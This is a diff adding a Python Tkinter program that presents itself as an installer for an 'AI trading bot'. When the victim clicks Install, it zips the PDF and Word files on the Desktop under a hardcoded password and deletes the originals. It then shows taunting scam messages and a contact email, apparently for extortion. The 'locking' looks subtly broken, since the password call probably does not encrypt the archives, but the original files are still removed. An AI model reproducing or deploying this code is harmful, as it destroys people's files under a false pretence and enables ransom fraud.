@@ -1,0 +1,109 @@
+import os
+import zipfile
+import tkinter as tk
+from tkinter import ttk, messagebox
+
+# كلمة السر للقفل
+PASSWORD = "Itchnisunshinewego1"
+
+class FileLockerApp:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("install setup")
+        self.root.geometry("400x200")
+        
+        self.setup_ui()
+    
+    def setup_ui(self):
+        # إطار رئيسي
+        main_frame = ttk.Frame(self.root, padding="20")
+        main_frame.pack(expand=True, fill=tk.BOTH)
+        
+        # تسمية العنوان
+        title_label = ttk.Label(
+            main_frame, 
+            text="installing",
+            font=('Helvetica', 12, 'bold')
+        )
+        title_label.pack(pady=10)
+        
+        # زر القفل
+        lock_button = ttk.Button(
+            main_frame,
+            text="Install",
+            command=self.lock_files,
+            style='Accent.TButton'
+        )
+        lock_button.pack(pady=20, ipadx=10, ipady=5)
+        
+        # شريط التقدم
+        self.progress = ttk.Progressbar(
+            main_frame,
+            orient=tk.HORIZONTAL,
+            length=300,
+            mode='determinate'
+        )
+        self.progress.pack(pady=10)
+        
+        # تسمية الحالة
+        self.status_label = ttk.Label(
+            main_frame,
+            text="AI trading bot",
+            font=('Helvetica', 9)
+        )
+        self.status_label.pack()
+        
+        # تحسين المظهر
+        self.root.style = ttk.Style()
+        self.root.style.configure('Accent.TButton', font=('Helvetica', 10, 'bold'), foreground='white', background='#dc3545')
+    
+    def lock_files(self):
+        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+        files_to_lock = [f for f in os.listdir(desktop_path) 
+                        if f.lower().endswith((".pdf", ".doc", ".docx")) 
+                        and not f.endswith(".locked")]
+        
+        if not files_to_lock:
+            messagebox.showinfo("LUCKY BITCH")
+            return
+        
+        total_files = len(files_to_lock)
+        locked_count = 0
+        
+        self.progress['maximum'] = total_files
+        self.progress['value'] = 0
+        
+        for i, file in enumerate(files_to_lock, 1):
+            file_path = os.path.join(desktop_path, file)
+            try:
+                # إنشاء أرشيف مضغوط بكلمة سر
+                zip_path = file_path + ".locked"
+                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                    zipf.setpassword(PASSWORD.encode('utf-8'))
+                    zipf.write(file_path, os.path.basename(file_path))
+                
+                # حذف الملف الأصلي بعد التأكد من إنشاء الأرشيف
+                if os.path.exists(zip_path):
+                    os.remove(file_path)
+                    locked_count += 1
+                
+                # تحديث الواجهة
+                self.progress['value'] = i
+                self.status_label.config(text=f"Installing: {i}/{total_files}")
+                self.root.update_idletasks()
+                
+            except Exception as e:
+                messagebox.showerror("okay", f"LUCKY BITCH {file}: {str(e)}")
+        
+        messagebox.showinfo(
+            "U got scamed idiot", 
+            f"تم قفل {locked_count}  {total_files} ملف بنجاح!\n\n"
+            "Contact me at louaimss9@gmail.com"
+        )
+        self.status_label.config(text=f"تم قفل {locked_count} ملف بنجاح")
+        self.progress['value'] = 0
+
+if __name__ == "__main__":
+    root = tk.Tk()
+    app = FileLockerApp(root)
+    root.mainloop()
